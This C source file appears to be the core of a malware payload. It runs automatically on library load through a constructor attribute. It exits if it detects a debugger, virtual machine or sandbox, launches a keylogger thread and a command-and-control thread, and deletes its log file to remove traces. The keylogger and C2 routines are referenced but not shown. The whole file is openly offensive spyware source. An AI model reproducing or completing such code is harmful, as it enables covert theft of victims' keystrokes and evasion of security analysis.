#include "payload.h"
#include "payload_config.h"
#include "evasion.h"
#include "config.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>

static pthread_t keylogger_thread;
static pthread_t c2_thread;
static int payload_running = 0;

void init_payload() {
    // Perform evasion checks
    if (check_debugger() || check_vm() || check_sandbox()) {
        fprintf(stderr, "Evasion check failed! Exiting...\n");
        exit(EXIT_FAILURE);
    }

    // Initialize payload
    payload_running = 1;
    printf("%s initialized successfully\n", PAYLOAD_NAME);

    // Start keylogger thread
    if (pthread_create(&keylogger_thread, NULL, keylogger_start, NULL) != 0) {
        perror("Failed to create keylogger thread");
        payload_running = 0;
        exit(EXIT_FAILURE);
    }

    // Start C2 communication thread
    if (pthread_create(&c2_thread, NULL, c2_communication_start, NULL) != 0) {
        perror("Failed to create C2 thread");
        payload_running = 0;
        pthread_cancel(keylogger_thread);
        exit(EXIT_FAILURE);
    }
}

void start_payload() {
    if (!payload_running) {
        init_payload();
    }
    printf("%s started\n", PAYLOAD_NAME);
}

void stop_payload() {
    if (payload_running) {
        payload_running = 0;
        pthread_cancel(keylogger_thread);
        pthread_cancel(c2_thread);
        pthread_join(keylogger_thread, NULL);
        pthread_join(c2_thread, NULL);
        printf("%s stopped\n", PAYLOAD_NAME);
    }
}

void cleanup_payload() {
    stop_payload();
    // Remove traces
    remove(LOG_FILE);
    printf("%s cleaned up\n", PAYLOAD_NAME);
}

__attribute__((constructor)) void payload_constructor() {
    start_payload();
}

__attribute__((destructor)) void payload_destructor() {
    cleanup_payload();
}